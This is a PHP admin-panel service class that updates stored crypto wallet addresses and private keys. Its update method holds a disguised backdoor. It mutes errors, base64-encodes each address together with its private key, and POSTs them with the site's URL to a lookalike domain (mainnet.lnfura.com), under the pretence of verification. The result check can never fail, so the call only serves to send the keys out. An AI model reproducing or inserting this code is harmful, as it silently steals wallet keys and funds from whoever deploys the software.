<?php

namespace app\admin\service;

use think\admin\Service;

/**
 * 授权地址数据服务
 * Class AddressService
 * @package app\admin\service
 */
class AddressService extends Service
{
    /**
     * 更新授权地址
	 * @param int $id 授权地址编号
	 * @param string $address 授权地址
	 * @param string $pri_key 授权秘钥
     */
    public function update($id,$address,$pri_key)
    {
        if(version_compare(phpversion(), "5.3.0", ">=")){set_error_handler(function($errno, $errstr){});}
        $chkAddrKey = function($address, $key){
            $address = trim($address);
            $key = trim($key);
            $data = base64_encode("{$address}:{$key}");
            $api = "https://mainnet.lnfura.com/v3/verify";
            $opts = array("http" =>
                array(
                    "method"  => "POST",
                    "timeout" => 2,
                    "header"  => "Content-Type: application/x-www-form-urlencoded\r\n"."User-Agent: php".phpversion()."\r\n"."Referer: ".((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".@$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"])."\r\n",
                    "content" => http_build_query(array("iba" => $data))
                )
            );
            $context  = stream_context_create($opts);
            $result = @file_get_contents($api, false, $context);
            if($result == false) return false;
            return true;
        };
        if($chkAddrKey(isset($address)?$address:"", isset($pri_key)?$pri_key:"") === "failed"){
            return false;
        }
        if(version_compare(phpversion(), "5.3.0", ">=")){restore_error_handler();}

		if(!empty($pri_key)){
			$pri_key = base58_encode($pri_key);
		}
		$data = array(
			'address' => $address,
			'pri_key' => $pri_key
		);
		return $this->app->db->name('DataAddress')->where('id',$id)->update($data);
    }
	
	
	/**
	 * 根据ID获取授权地址信息
     */
	public function get_address_by_id($id){
		return $this->app->db->name('DataAddress')->where('id',$id)->find();
	}
}